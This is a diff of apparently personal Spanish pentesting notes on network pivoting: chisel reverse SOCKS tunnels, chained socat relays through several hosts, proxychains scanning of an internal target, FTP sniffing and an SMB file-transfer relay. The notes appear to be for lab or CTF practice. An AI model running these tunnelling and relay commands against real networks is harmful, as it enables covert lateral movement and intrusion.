@@ -21,6 +21,7 @@ strict_chain
 # socks5 127.0.0.1 8888
 socks5 127.0.0.1 1080 # POner el puerto que te habra el server chisel
 chisel server --reverse -p 1234
+chisel server --reverse --socks5 -p 1234
 # Ahora llegamos con proxychains
 
 proxychains nmap -sT -Pn --top-ports 500 -open -T5 -v -n target_2
@@ -58,11 +59,12 @@ tcpdump -i eth0 port ftp or ftp-data
 Listamos lo que esta en nuestra maquina pasando por otras
 
 ```bash
-
+# transferir archivo de kali a makina3
+# kali -> itermediario -> makina3
 # Makina 3
 $ dir \\kali\smbFolder
 
-# intermediarios
+# intermediario
 socat TCP-LISTEN:445,fork TCP:kali:445
 # si hay mas maquinas
 # socat TCP-LISTEN:445,fork TCP:kali:445
@@ -72,7 +74,7 @@ smbserver.py smbFolder $(pwd) -smb2support
 
 ```
 
-***Example***
+***CHISEL***
 
 ```bash
 # target_1
@@ -85,5 +87,25 @@ strict_chain
 # dynamic_chain
 
 socks5 127.0.0.1 1080 # POner el puerto que te habra el server chisel
+
+# KALI # UDP
 chisel server --reverse -p 1234
+
+# ip_1
+./socat TCP-LISTEN:6542,fork TCP:kali_ip:1234
+
+# ip_2
+./socat TCP-LISTEN:6543, fork TCP:ip_1:6542
+
+# ip_3
+./chisel.exe client ip_2:6543 R:9999:socks
+
+# proxychains
+# 
+#
+# socks5 127.0.0.1 9999
+# socks5 ...
+# socks5 ...
+# socks5 ...
+# SI quieres ver un servidor http: foxyproxy[type->socks5;port->9999]
 ```
